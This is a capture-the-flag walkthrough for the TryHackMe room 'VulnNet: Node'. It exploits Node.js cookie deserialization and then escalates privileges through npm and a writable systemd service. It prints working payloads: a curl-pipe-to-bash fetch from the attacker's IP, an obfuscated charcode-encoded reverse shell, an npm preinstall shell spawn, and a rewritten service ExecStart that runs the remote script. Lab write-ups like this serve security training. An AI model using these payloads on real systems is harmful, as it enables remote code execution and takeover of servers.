---
description: Javascript
---

# 24 - VulnNet: Node

Room Link --> [https://tryhackme.com/room/vulnnetnode](https://tryhackme.com/room/vulnnetnode)

### Enumertion

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo nmap -sS 10.10.234.78 -Pn -n -p- -T5 -vv

# output
PORT     STATE SERVICE    REASON
8080/tcp open  http-proxy syn-ack ttl 63
```
{% endcode %}

<figure><img src=".gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Wappalyzer shows us the page is running NodeJS.

Enumerating with gobuster, ffuf returned "/login". Intercepting the request with burpsuite, we see we are already assigned a  cookie.

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>in b64 format</p></figcaption></figure>

Lets decode it, in the decoder bar i selected decode as b64.

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Looking at the screenshot above we some some JSON encoded data. My first thought was maybe we could bypass the whole login process if we might change the cookie making the web application think we are admins

And i tried that first

<figure><img src="https://miro.medium.com/v2/resize:fit:481/1*-O0ze1yZRIpR9WQ1puhE0g.png" alt="" height="288" width="700"><figcaption></figcaption></figure>

Next i sent the modified session cookie and the web application throws a 500 statuscode error.

\


<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

When you google NodeJS Serialization exploits, you stumble on this article: [https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

{% code overflow="wrap" lineNumbers="true" %}
```bash
# this is the payload.
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```
{% endcode %}

We will modify the following payload a bit to get it working.

To make sure that the exploit was working i tried pinging myself. First i did set up a tcpdump listener.

<figure><img src=".gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we got some replies back.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

#### Reverse shell

{% code overflow="wrap" lineNumbers="true" %}
```bash
# final payload
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl 10.18.88.214/shell.sh | bash ', function(error, stdout, stderr) { console.log(stdout) });\n }()","isAdmin":true,"encoding": "utf-8"}

# or we can use the nodeshell.py script on github:
https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py

{"username":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,56,46,56,56,46,50,49,52,34,59,10,80,79,82,84,61,34,57,57,57,57,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()","isGuest":true,"encoding": "utf-8"}
```
{% endcode %}

And got shell.

<figure><img src=".gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Priv Ess to Serv-manage

`sudo -l` - we can run npm with sudo as user "serv-manage"

So, we create a package.json with the following content:

<pre class="language-bash"><code class="lang-bash"><strong>echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
</strong></code></pre>

Then, we simply run `sudo -u serv-manage /usr/bin/npm i` and voila, we are logged in as `serv-manage`, which had the `user.txt` flag right in their home folder for us to read.

### Priv Esc to root

Running sudo -l again, we find that we can edit a system ditimer service called vulnnet-auto.timer

<figure><img src=".gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

We are in the "serv-manage" group, so we have "RW" permissions to  modify this file.

<figure><img src=".gitbook/assets/image (201).png" alt=""><figcaption></figcaption></figure>

Let’s use locate to find the vulnnet service we have access to and examine it.

This service appears to refer to another service vulnnet-job.service let’s take a look at it too.

{% code overflow="wrap" lineNumbers="true" %}
```bash
locate vulnnet-auto.timer.timer
ls -lah /etc/systemd/system/vulnnet-job.service
cat /etc/systemd/system/vulnnet-job.service

# modified to
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c "curl 10.18.88.214/shell.sh | bash"

[Install]
WantedBy=multi-user.target


```
{% endcode %}

Note i had to create a shell.sh file then put bash one-liner rev shell in it, and serve it in python server.

<figure><img src=".gitbook/assets/image (202).png" alt=""><figcaption></figcaption></figure>

Done.

